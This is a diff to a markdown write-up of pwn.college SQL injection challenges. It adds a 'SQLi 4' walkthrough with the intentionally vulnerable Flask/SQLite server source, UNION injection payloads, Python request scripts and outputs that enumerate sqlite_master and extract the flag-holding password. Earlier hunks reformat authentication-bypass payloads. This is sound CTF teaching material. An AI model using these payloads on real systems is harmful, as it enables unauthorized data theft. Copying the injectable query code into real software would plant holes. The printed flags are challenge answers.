@@ -1021,9 +1021,10 @@ app.run("challenge.localhost", 80)
 
 Let's try the following credentials:
 
-| identity | pin |
-|-|-|
-| admin | 0 OR 1=1 |
+```
+identity: admin
+pin: 0 OR 1=1
+```
 
 The resultant SQL query will be:
 
@@ -1153,9 +1154,10 @@ This time, there are single quotes (`'`) around the `password`. We can easily wo
 
 Let's try the following credentials:
 
-| identity | pass |
-|-|-|
-| admin | 0' OR 1=1-- - |
+```
+identity: admin
+pass: 0' OR 1=1-- -
+```
 
 The resultant SQL query will be:
 
@@ -1273,11 +1275,15 @@ This time the flag is stored in the `password` field of the `admin` user. Howeve
 SELECT username FROM users WHERE username LIKE "{query}"
 ```
 
+### SQL injection
+
+#### UNION attack
+
 Let's try the following parameters:
 
-| query |
-|-|
-| admin" UNION SELECT password FROM users WHERE username="admin"-- - |
+```
+query: admin" UNION SELECT password FROM users WHERE username="admin"-- - 
+```
 
 The resultant SQL query will be:
 
@@ -1297,3 +1303,202 @@ pwn.college{wz14oEOmcepM7OVPxb4zm3bCC2L.dFTOzMDL4ITM0EzW}
 </pre>
         </body></html>
 ```
+
+&nbsp;
+
+## SQLi 4
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import random
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+random_user_table = f"users_{random.randrange(2**32, 2**33)}"
+db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+# https://www.sqlite.org/lang_insert.html
+db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")
+
+
+@app.route("/", methods=["GET"])
+def challenge():
+    query = flask.request.args.get("query", "%")
+
+    try:
+        # https://www.sqlite.org/schematab.html
+        # https://www.sqlite.org/lang_select.html
+        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
+        print(f"DEBUG: {query=}")
+        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+    except sqlite3.Error as e:
+        results = f"SQL error: {e}"
+
+    return f"""
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
+        <b>Results:</b><pre>{results}</pre>
+        </body></html>
+        """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+In this challenge, the table name is randomized, so we first have to figure that out.
+
+#### Retrieving SQLite version
+
+The SQLite version can be retrieved using the following query:
+
+```
+SELECT sqlite_version();
+```
+
+If we provide the following request:
+
+```
+query: 'admin" UNION SELECT sqlite_version()-- -'
+```
+
+The resultant query will be:
+
+```
+SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sqlite_version()-- -"
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80"
+params = {
+    "query": 'admin" UNION SELECT sqlite_version()-- -'
+}
+response = requests.get(url, params = params)
+print(response.text)
+```
+
+```
+hacker@web-security~sqli-4:/$ python ~/script.py 
+
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='admin" UNION SELECT sqlite_version()-- -'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT sqlite_version()-- -"</pre><br>
+        <b>Results:</b><pre>3.31.1
+admin</pre>
+        </body></html>
+```
+
+#### Listing the tables
+
+For SQLite versions `3.33.0` and previous, the `sqlite_master` table contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.
+
+```
+SELECT sql FROM sqlite_master
+```
+
+If we provide the following request:
+
+```
+query: 'admin" UNION SELECT sql FROM sqlite_master-- -'
+```
+
+The resultant query will be:
+
+```
+SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sql FROM sqlite_master-- -"
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80"
+params = {
+    "query": 'admin" UNION SELECT sql FROM sqlite_master-- -'
+}
+response = requests.get(url, params = params)
+print(response.text)
+```
+
+```
+hacker@web-security~sqli-4:/$ python ~/script.py 
+
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='admin" UNION SELECT sql FROM sqlite_master-- -'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT sql FROM sqlite_master-- -"</pre><br>
+        <b>Results:</b><pre>CREATE TABLE users_4902969274(username,password)
+admin</pre>
+        </body></html>
+```
+
+#### Retrieving the password
+
+Now that we know the table name is `users_4902969274`, we can easily retrieve the password from the table.
+
+If we provide the following request:
+
+```
+query: 'admin" UNION SELECT password FROM users_4902969274-- -'
+```
+
+The resultant query will be:
+
+```
+SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT password FROM users_4902969274-- -"
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80"
+params = {
+    "query": 'admin" UNION SELECT password FROM users_4902969274-- -'
+}
+response = requests.get(url, params = params)
+print(response.text)
+```
+
+```
+hacker@web-security~sqli-4:/$ python ~/script.py 
+
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='admin" UNION SELECT password FROM users_4902969274-- -'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT password FROM REDACTED-- -"</pre><br>
+        <b>Results:</b><pre>admin
+password
+pwn.college{AlwY4pMMjmQroxd9XEXlpIAKgEF.dJTOzMDL4ITM0EzW}
+</pre>
+        </body></html>
+```
+
+&nbsp;
